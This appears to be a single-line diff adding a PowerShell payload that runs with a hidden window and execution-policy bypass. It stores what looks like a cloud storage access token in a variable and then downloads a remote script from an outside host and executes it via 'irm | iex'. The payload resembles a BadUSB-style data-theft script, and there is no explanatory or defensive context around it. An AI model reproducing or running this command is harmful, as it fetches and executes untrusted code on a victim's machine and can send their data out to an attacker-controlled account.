@@ -1,0 +1,1 @@
+powershell -w h -NoP -Ep Bypass $dc='';$db='sl.Bepdm-qWPvRLkOPICx_jyNOPSxdkSWGLjYKCPo7hiahoZiL1YmKIPRrOL8kPpCktA6PIpLGOP5EpZOt3kl6BPVCcLM9eFf8xNAFtNsHiG0xgPkLXwBVmrjxl3W3H93Mrbqj6xas';irm jakoby.lol/f0x | iex
